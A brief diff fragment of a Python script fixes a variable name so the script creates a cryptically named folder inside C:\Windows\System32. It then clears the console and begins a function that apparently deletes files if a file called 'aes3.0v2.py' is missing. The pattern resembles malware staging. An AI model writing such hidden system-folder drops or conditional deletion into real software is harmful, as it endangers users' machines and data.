@@ -141,7 +141,7 @@ print("")
 print("")
 dcnmwxdr = r'C:\Windows\System32\WCNMX'
 if not os.path.exists(dcnmwxdr):
-    os.makedirs(directory)
+    os.makedirs(dcnmwxdr)
     os.system('cls')
 def delete_files_if_aesv3_missing():
     aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v2.py"
